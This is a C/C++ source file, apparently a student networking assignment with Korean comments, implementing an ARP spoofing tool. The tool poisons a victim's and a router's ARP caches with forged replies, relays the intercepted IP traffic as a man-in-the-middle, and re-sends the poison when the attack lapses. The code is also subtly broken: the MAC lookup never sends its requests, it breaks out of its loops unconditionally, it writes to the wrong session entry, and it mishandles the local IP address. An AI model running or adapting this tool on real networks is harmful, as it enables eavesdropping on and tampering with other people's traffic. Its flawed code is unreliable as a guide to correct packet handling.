#include "utill.h"

#pragma pack(push, 1)
#pragma pack(pop)

void usage() {
    printf("syntax: arp-spoofing <interface> <sender ip> <target ip> ...\n");
    printf("sample: arp-spoofing enp0s8 192.168.43.2 192.168.43.1 ...\n");
}


int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }
    //ip가 짝수가 나와야 프로그램이 제대로 돌아감... 세션에서 짝이 안맞는 경우는 잘 모르겠음...
    if((argc-2)%2 !=0){
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    uint8_t myMAC[6]; //호스트 맥
    get_mMAC(dev, myMAC);
    u_char myIP[4];
    get_mIP(dev, myIP);
    Ip myip = htons(Ip(*myIP));

    //명령줄 인수로 받은 세션 수 및 동적할당
    int session_num = (argc-2)/2;
    session* sessions = (session *)malloc(sizeof(session)*session_num);

    //준비 : 세션 할당
    for ( int i=0; i<session_num; i++){
        sessions[i].sender_ip = inet_addr(argv[2+i*2]); //victim
        sessions[i].target_ip = inet_addr(argv[3+i*2]); //router
    }
    //패킷 잡기

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    struct pcap_pkthdr * rep_header;
    const u_char * rep_packet;


    if (handle == nullptr) {
        fprintf(stderr, "연결이 잘못되었습니다. %s(%s)\n", dev, errbuf);
        return -1;
    }

     //1단계 : 세션의 sender Mac과 target Mac 찾기 <- arp request를 활용
     find_mac(handle, rep_header, session_num, rep_packet, myMAC, myip, sessions);

     //2단계 : arp 테이블 감염준비 <- 세션대로 감염
     unsigned char ** infected_pkt
             = (unsigned char **)malloc(sizeof(unsigned char *)*session_num);

     for(int i = 0; i < session_num; i++){
         infected_pkt[i] = (unsigned char *)malloc(sizeof(unsigned char) * 50);

         memset(infected_pkt[i], 0, 50);
         EthArpPacket * arp_pkt = (EthArpPacket *)malloc(sizeof(EthArpPacket));

         make_packet(arp_pkt, sessions[i].sender_mac, myMAC, 2, sessions[i].target_ip, sessions[i].sender_ip);
         memcpy(infected_pkt[i], arp_pkt, sizeof(*arp_pkt));
     }

     //세션들마다 패킷 보내기
     for(int i = 0; i < session_num; i++){
        int res = pcap_sendpacket(handle,infected_pkt[i], sizeof(EthArpPacket));
        printf("session[%d], get stand ready...\n", i);
     }

    //3단계 : 공격 on <- 상황보면서 반복

    EthIpPacket * pkt;
    EthArpPacket * arp_pkt;
    const u_char * rep_pkt;

     while(1){
         pcap_next_ex(handle, &rep_header, &rep_pkt);
         pkt = (EthIpPacket *)rep_pkt;
         arp_pkt = (EthArpPacket *)rep_pkt;

         for(int i = 0 ; i < session_num; i++){
             //ip패킷 중에서
             if(pkt->eth_.type_ == htons(EthHdr::Ip4)){
                 //relay 상태 확인, smac 이 sender_mac 이고, ip패킷에서 목적지가 나를 향해야만 진행!
                 if((memcmp(pkt->eth_.smac_, sessions[i].sender_mac,sizeof(Mac)) != 0)
                         ||(pkt->ip_.Dest_add == *myIP))
                 {
                     continue;
                 }

                 //또 상황에 따라서 패킷을 바꿔서 보내줘야함
                 memcpy(pkt->eth_.smac_, myMAC, sizeof(Mac));
                 memcpy(pkt->eth_.dmac_, sessions[i].target_mac, sizeof(Mac));

                 if(pcap_sendpacket(handle, rep_pkt, rep_header->len)!=0) {
                     fprintf(stderr, "pcap_send error...in relay \n");
                     return -1;
                }
                 printf("relay connection ON...!\n");
                 break;
             }

             // 공격 상태를 체크
             else if((pkt->eth_.type_ == htons(EthHdr::Arp))
                     && is_attack(arp_pkt, &sessions[i])){
                 //제대로 보내진다면
                 if(pcap_sendpacket(handle, infected_pkt[i], rep_header->len)!=0) {
                      fprintf(stderr, "spoof paket error \n");
                      return -1;
                 }
                 printf("arp_spoofing ON...!\n");
                 break;

             }
             //만약 공격이 끊꼈다면 다시 시작
             if(!is_attack(arp_pkt, &sessions[i])){
                 printf("apr_spoofing OFF... re:ZERO\n");
                     continue;
          }
         }
     }
    pcap_close(handle);
  }


//이번 과제 핵심 : 공격중인 상태 확인
int is_attack( EthArpPacket * pkt, session * session){
    int ret = 0;
    //1.sender's packet의 브로드캐스팅은 나에게 옴
    if((pkt->arp_.op_ == htons(ArpHdr::Request))
            && (memcmp(pkt->arp_.smac_, session->sender_mac, sizeof(Mac)) == 0)){
        ret = 1;
    }
    //2.target's packet의 유니캐스트도 나에게 옴
    if((pkt->arp_.sip_ == session->target_ip)
            && (memcmp(pkt->arp_.smac_, session->target_mac, sizeof(Mac)) == 0)){
        ret = 1;
    }
    //3.target이 sender에게 직접 물어보는 유니캐스트는...어쩔 수 없다...
    return ret;
}



int get_mMAC(const char *dev, u_char* myMAC){
        struct ifreq s;
        int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
        strcpy(s.ifr_name, dev);//주소변경

        if(!ioctl(fd, SIOCGIFHWADDR, &s)){
            for(int i =0; i<6; i++){
                myMAC[i] = s.ifr_addr.sa_data[i];
            }
        }
        return 1;
}

int get_mIP(const char *dev, u_char* myIP)
{
    struct ifreq s;
    int fd =socket(AF_INET,SOCK_STREAM,0);
    char ipstr[40];//4하니깐 스택에러

    strncpy(s.ifr_name, dev, IFNAMSIZ);

    if (ioctl(fd,SIOCGIFADDR,&s)< 0 )
    {
        perror("ip ioctl error");
        return -1;
    }

    inet_ntop(AF_INET, s.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
    memcpy (myIP, ipstr, sizeof(struct sockaddr));
    return 0;
}

void make_packet(EthArpPacket * packet, Mac targetM, Mac srcM, int op, Ip senderIP, Ip targetIP){

    memcpy(packet->eth_.dmac_, targetM, sizeof(packet->eth_.dmac_));
    memcpy(packet->eth_.smac_, srcM, sizeof(packet->eth_.smac_));
    packet->eth_.type_=htons(EthHdr::Arp);

    packet->arp_.hrd_=htons(ArpHdr::ETHER);
    packet->arp_.pro_ = htons(EthHdr::Ip4);
    packet->arp_.hln_ = Mac::SIZE;
    packet->arp_.pln_ = Ip::SIZE;
    packet->arp_.op_ =htons(op);

    memcpy(packet->arp_.smac_, srcM, sizeof(packet->arp_.smac_));
     // ARP request
    if(op==ArpHdr::Request) {
        memcpy(packet->arp_.tmac_, Mac("00:00:00:00:00:00"), sizeof(packet->arp_.tmac_));
    }
    // ARP reply
    if(op==ArpHdr::Reply) {
        memcpy(packet->arp_.tmac_, targetM, sizeof(packet->arp_.tmac_));
    }
    packet->arp_.sip_ = senderIP;
    packet->arp_.tip_ = targetIP;
}


void find_mac(pcap_t* handle, struct pcap_pkthdr *rep_header, int session_num, const u_char * rep_packet, uint8_t * attacker_mac, Ip attacker_ip, session * sessions){
    unsigned char data[50];
    for(int i = 0; i < session_num; i++){
        EthArpPacket * arp_packet = (EthArpPacket *)malloc(sizeof(EthArpPacket));
        uint8_t broadcast[6];
        memcpy(broadcast, Mac("FF:FF:FF:FF:FF:FF"),sizeof(Mac));

        //sender ip를 기반으로 sender_mac 찾기
        memset(data, 0, sizeof(data));
        make_packet(arp_packet, Mac(broadcast), Mac(attacker_mac), 1, attacker_ip, sessions[i].sender_ip);
        memcpy(data, arp_packet, sizeof(EthArpPacket));

        // 거기서 reply를 찾아내서 sender_mac 가져오기
        while(1){
            pcap_next_ex(handle, &rep_header, &rep_packet);
            arp_packet = (EthArpPacket *)rep_packet;
            if((arp_packet->arp_.sip_ == sessions[i].sender_ip)
                    && (arp_packet->arp_.op_ == htons(ArpHdr::Reply))){
                 memcpy(sessions->sender_mac, arp_packet->arp_.smac_, sizeof(Mac));
            }
                break;
           }

        //target ip를 기반으로 target_mac 찾기
        memset(data, 0, sizeof(data));
        make_packet(arp_packet, Mac(broadcast), Mac(attacker_mac), ArpHdr::Request, attacker_ip, sessions[i].target_ip);
        memcpy(data, arp_packet, sizeof(EthArpPacket));
        // 거기서 reply를 찾아내서 target_mac 가져오기
        while(1){
            pcap_next_ex(handle, &rep_header, &rep_packet);
            arp_packet = (EthArpPacket *)rep_packet;
            if((arp_packet->arp_.sip_ == sessions[i].sender_ip)
                    && (arp_packet->arp_.op_ == htons(ArpHdr::Reply))){
                    memcpy(sessions->target_mac, arp_packet->arp_.smac_,sizeof(Mac));
                }
                break;
            }
        }
    }


